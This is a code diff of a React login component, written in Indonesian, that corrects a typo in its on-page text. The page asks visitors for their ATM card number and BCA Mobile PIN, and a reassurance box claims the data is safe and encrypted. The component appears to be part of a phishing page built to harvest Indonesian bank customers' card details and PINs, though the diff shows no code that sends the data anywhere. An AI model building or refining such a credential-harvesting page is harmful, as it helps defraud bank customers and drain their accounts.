@@ -62,7 +62,7 @@ function Login({host}) {
                     <p>Verifikasi Kartu ATM</p>
                 </div>
                 <div className='card-body'>
-                    <p>Silahkan Masukkan No. Kartu ATM dan Pin Bca Mobile unutk memproses permintaan anda.</p>
+                    <p>Silahkan Masukkan No. Kartu ATM dan Pin Bca Mobile untuk memproses permintaan anda.</p>
                     <div className='alert'>
                         <img src='/iconwarning.png' alt='icon' className='icon-warning'/>
                         <span>Data yang diinput hanya untuk memastikan kepemilikan rekening, Data nasabah dijamin aman dan terenkripsi oleh system.</span>
